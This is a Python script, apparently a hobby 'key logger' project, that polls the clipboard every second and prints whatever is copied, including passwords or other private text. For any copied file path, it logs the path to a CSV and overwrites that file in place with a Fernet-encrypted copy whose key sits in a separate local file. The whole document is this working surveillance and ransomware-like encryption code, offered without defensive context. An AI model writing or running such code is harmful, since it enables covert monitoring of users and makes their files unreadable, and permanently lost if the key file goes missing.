import time
import pyperclip
import os
import csv
from datetime import datetime
from cryptography.fernet import Fernet

# File to store the paths in CSV format
log_file = r"C:\Users\Logesh\Desktop\key logger\data.csv"
encryption_key_file = r"C:\Users\Logesh\Desktop\key logger\encryption_key.key"

def generate_key():
    """Generate a new encryption key and save it to a file."""
    key = Fernet.generate_key()
    with open(encryption_key_file, 'wb') as key_file:
        key_file.write(key)
    return key

def load_key():
    """Load the encryption key from a file or generate a new one if it doesn't exist."""
    if os.path.exists(encryption_key_file):
        with open(encryption_key_file, 'rb') as key_file:
            return key_file.read()
    else:
        print("Encryption key not found. Generating a new key.")
        return generate_key()

def encrypt_file(file_path):
    """Encrypt the given file using the loaded encryption key and overwrite the original file."""
    key = load_key()
    fernet = Fernet(key)
    try:
        with open(file_path, 'rb') as file:
            file_data = file.read()
        encrypted_data = fernet.encrypt(file_data)
        # Overwrite the original file with encrypted data
        with open(file_path, 'wb') as file:
            file.write(encrypted_data)
        print(f"File encrypted and saved as: {file_path}")
    except Exception as e:
        print(f"Error encrypting file: {e}")

def log_file_path(file_path):
    """Log the file path to the CSV file with a timestamp and encrypt the file."""
    # Remove any leading or trailing quotes
    file_path = file_path.strip('"')
    with open(log_file, 'a', newline='') as file:
        writer = csv.writer(file)
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        writer.writerow([timestamp, file_path])
    encrypt_file(file_path)

def is_valid_file_path(path):
    """Check if the clipboard content is a valid file path."""
    path = path.strip('"')  # Remove any surrounding quotes
    return os.path.isfile(path) or os.path.isdir(path)

def get_clipboard_content():
    """Get the clipboard content and handle possible errors."""
    try:
        return pyperclip.paste()
    except pyperclip.PyperclipException as e:
        print(f"Error accessing clipboard: {e}")
        return None

def monitor_clipboard():
    """Monitor clipboard for changes and log valid file paths or copied content."""
    previous_clipboard_content = ''
    print("Monitoring clipboard. Press Ctrl+C to stop.")
    while True:
        current_clipboard_content = get_clipboard_content()
        if current_clipboard_content and current_clipboard_content != previous_clipboard_content:
            previous_clipboard_content = current_clipboard_content
            if is_valid_file_path(current_clipboard_content):
                print(f"File path detected: {current_clipboard_content}")
                log_file_path(current_clipboard_content)
            else:
                print(f"Copied content detected: {current_clipboard_content}")
                # Here, you could add additional functionality to handle copied content
        time.sleep(1)

if __name__ == "__main__":
    # Create CSV file with headers if it doesn't exist
    if not os.path.exists(log_file):
        with open(log_file, 'w', newline='') as file:
            writer = csv.writer(file)
            writer.writerow(["Timestamp", "File Path"])
    monitor_clipboard()
